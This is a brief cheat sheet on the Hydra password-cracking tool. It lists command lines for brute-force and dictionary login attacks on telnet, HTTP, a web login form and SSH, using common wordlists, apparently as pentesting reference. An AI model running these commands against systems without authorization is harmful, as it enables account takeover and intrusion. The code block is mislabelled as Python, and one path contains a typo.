### HYDRA
Fast, parallelized, network authentication cracker that supports different protocols: `Cisco auth`, `FTP`, `HTTP`, `IMAP`, `RDP`, `SMB`, `SSH`, `Telnet`...

```python
# To get detailed information about a module:
hydra -U rdp

# To launch a dictionary attack against a service:
hydra -L users.txt -P pass.txt <service://server> <options>

# For instance
hydra -L users.txt -P pass.txt telnet://target.server

# Attack session against a password protected web resource
hydra -L users.txt -P pass.txt http-get://localhost/

# Brute-force login form
# => See Module Info
> hydra -U http-post-form
# Our cmd
> hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/sseclist/Passwords/rockyou-15.txt -f -V

# Brute-force SSH
hydra 10.10.10.3 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V

# -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
# -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
```
